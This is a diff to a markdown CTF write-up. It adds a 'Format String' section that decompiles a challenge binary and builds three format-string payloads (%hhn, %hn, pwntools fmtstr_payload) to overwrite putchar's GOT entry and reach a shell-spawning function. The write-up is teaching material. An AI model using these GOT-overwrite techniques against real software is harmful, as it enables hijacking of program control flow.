@@ -72,7 +72,7 @@ sudo ln -s /usr/mipsel-linux-gnu /etc/qemu-binfmt/mipsel
 
 ![alt text](/images/image-8.png)
 
-#### Use Ghidra to Decompile:
+Use Ghidra to Decompile:
 
 ![alt text](/images/image-7.png)
 ![alt text](/images/image-6.png)
@@ -105,7 +105,7 @@ Next, we need to find the offset to ret to overwrite with the address of `call r
 
 Using ```cyclic -l``` finds an offset of 536.
 
-#### Exploit
+Exploit:
 ```
 #!/usr/bin/ python3
 
@@ -274,3 +274,110 @@ p.interactive()
 ---
 
 ### Format String
+
+![alt text](/images/image3-0.png)
+
+Use Ghidra to Decompile:
+
+![alt text](/images/image-1-3.png)
+![alt text](/images/image-2-3.png)
+![alt text](/images/image-3-3.png)
+
+We see that there are two gets functions but canary found so we cannot use buffer overflow. However, there is a printf function `printf((char *)((long)&uStack_e9 + 1),local_78);` with format string, which we can use to exploit the program. The `get_flag` function creates a shell, so the goal will be format string to execute this function.
+
+Next, we see that the RELRO part in the checksec is `Partial RELRO`, so we can use format string to overwrite GOT.
+
+> RELRO (Relocation Read-Only) is a protection mechanism in Linux that prevents the exploitation of vulnerabilities related to writing to program symbol tables (such as GOT - Global Offset Table). RELRO is designed to make in-memory symbol tables read-only, reducing the possibility of exploits via function address overwriting.
+> 
+> * `No RELRO`:
+> Do not enable the RELRO mechanism. GOT and symbol tables are not protected, allowing attackers to overwrite addresses in GOT to redirect program execution (hijack control flow).
+> * `Partial RELRO`:
+> Protects only part of the symbol panels. Only certain areas (like .got.plt) are marked as read-only, but leave other areas (like .plt or .got) writable.
+> * `Full RELRO`:
+> Protects the entire GOT table and other symbol tables, making them completely read-only after linking is complete. GOT is converted to read-only state by reordering and completing the initialization process before the program begins to execute
+
+![alt text](/images/image-4-3.png)
+
+It's easy to see that after the `printf` function is the `putchar` function, so we will use format string to overwrite the `putchar@got` address into the `get_flag` function with `%n` and `%c`. Because the binary address is static, we have:
+
+```
+putchar@got = 0x404018
+get_flag = 0x401349
+```
+
+The two addresses above only differ in the last 2 bytes, so we only need to overwrite 2 bytes.
+
+The first step to exploit, need to find the offset. In the first `gets` function, we enter a long string of characters, in the second `gets` function we skip it, and in the `printf` function we see where `printf` will format string with an offset of 112.
+
+![alt text](/images/image-5-3.png)
+
+After finding the offset, perform format string to overwrite `putchar`. There are 2 ways here: overwrite each byte or overwrite 2 bytes at the same time.
+
+#### First way: Overwrite each byte.
+
+We will divide `0x1349` into 2 parts: `0x49` and `0x13`, overwriting the last part one by one.
+
+```
+payload  = b'A'*112
+payload += f'%73c%23$hhn'.encode()
+payload += f'%202c%24$hhn'.encode()
+payload += b'a'
+payload += p64(0x404018)
+payload += p64(0x404019)
+```
+
+![alt text](/images/image-6-3.png)
+
+```
+%73c: Prints 73 characters. 
+%23$hhn: Write 1 byte (hhn as writing 1 byte) to the address located at position 23 in the stack (counting from the top of the stack which is the 6th parameter). (Overwrite 0x49 (73 decimal) to 0x404018).
+
+%202c: Prints 202 characters. Now the total printed characters are 202 + 73 = 275. But because it is a byte (0-255), 275 will become 19 (0x13).
+%24$hhn: Write 1 byte to the address located at position 24 in the stack. (Overwrite 0x13 to 0x404019).
+
+And payload += b'a' is used to align the stack.
+```
+
+![alt text](/images/image-8-3.png)
+
+#### Second way: Overwrite 2 byte.
+
+```
+payload  = b'A'*112
+payload += f'%4937c%22$hn'.encode()
+payload += b'A' * 4
+payload += p64(0x404018)
+```
+
+![alt text](/images/image-7-3.png)
+
+```
+%4937c: Prints 4937c characters. 
+%22$hn: Write 2 byte (hn as writing 2 byte) to the address located at position 22 in the stack (Overwrite 0x1349 (4937 decimal) to 0x404018).
+
+payload += b'A' * 4 is used to align the stack.
+```
+
+![alt text](/images/image-9-3.png)
+
+#### Third way: Use `fmtstr_payload`.
+
+The `fmtstr_payload` function is a useful feature in the `pwntools` library, used to generate payloads for format string vulnerabilities. This function helps exploit vulnerabilities by writing to specific addresses in memory or reading values ​​from there.
+```
+payload = b'A' * 112
+payload += fmtstr_payload(20,{putchar : get_flag})
+
+assert(len(payload) < (0x158 - 0x78))   
+```
+```
+20: Offset of the parameter in the stack (from top to bottom).
+{putchar: get_flag}: Is a dictionary containing address: value pairs, in which:
+  putchar: Address to overwrite (usually the address of a function in GOT).
+  get_flag: The value will be written to the above address (usually the address of a function or shellcode).
+
+assert(len(payload) < (0x158 - 0x78)): Make sure that the size of the entire payload does not exceed the limit of 224. If the condition is true, the program continues to run normally. If the condition is false (payload exceeds 224 bytes), the program stops and reports an AssertionError. Because if it overflows, it will overwrite the second parameter of printf and will not be format string.
+```
+
+![alt text](/images/image-10-3.png)
+
+### Off-By-One
